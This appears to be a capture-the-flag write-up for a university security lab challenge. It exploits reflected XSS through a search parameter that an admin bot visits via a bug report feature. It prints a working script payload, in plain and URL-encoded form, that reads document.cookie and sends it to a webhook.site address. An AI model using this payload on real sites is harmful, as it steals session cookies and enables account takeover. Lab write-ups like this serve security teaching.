# Challenge `My favourite cookies` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Vulnerable to XSS

- Where: Where is the vulnerability present
  - `http://mustard.stt.rnl.tecnico.ulisboa.pt:23251`, on the bug report feature

- Impact: What results of exploiting this vulnerability
  - Allows the user to run code through XSS, used to steal cookies

## Steps to reproduce

1. Access `http://mustard.stt.rnl.tecnico.ulisboa.pt:23251`
2. The link given on the bug report feature will be accessed by the admins
3. In order to get the flag, the admin must send their cookies to our `WebHook`
4. Searched for the following code on the search bar, in order to get the link to be pressed:

```html
<script>var url = 'https://webhook.site/a3d25143-6e57-4354-b50c-c0c6fe1a3db9/?cookies=' + encodeURIComponent(document.cookie); fetch(url);</script> 
```

5. The link passed was the following:

`http://mustard.stt.rnl.tecnico.ulisboa.pt:23251/?search=%3Cscript%3Evar+url+%3D+%27https%3A%2F%2Fwebhook.site%2Fa3d25143-6e57-4354-b50c-c0c6fe1a3db9%2F%3Fcookies%3D%27+%2B+encodeURIComponent%28document.cookie%29%3B+fetch%28url%29%3B%3C%2Fscript%3E+`